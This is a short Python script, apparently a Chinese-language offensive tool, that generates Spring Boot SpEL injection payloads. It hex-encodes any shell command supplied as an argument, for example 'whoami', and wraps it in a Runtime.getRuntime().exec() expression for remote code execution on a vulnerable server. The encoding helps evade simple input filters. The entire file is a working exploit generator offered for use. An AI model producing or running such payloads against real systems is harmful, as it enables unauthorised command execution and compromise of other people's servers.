# coding: utf-8
import sys
print('此工具提供springboot-spel-rce的利用payload！\n例如：python springboot-spel-rce.py "whoami"')
cmd = sys.argv[1]
result = ""
print(cmd)
for x in cmd:
    result += hex(ord(x)) + ","
res = result.rstrip(',')
print("payload:\n${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{%s}))}"%res)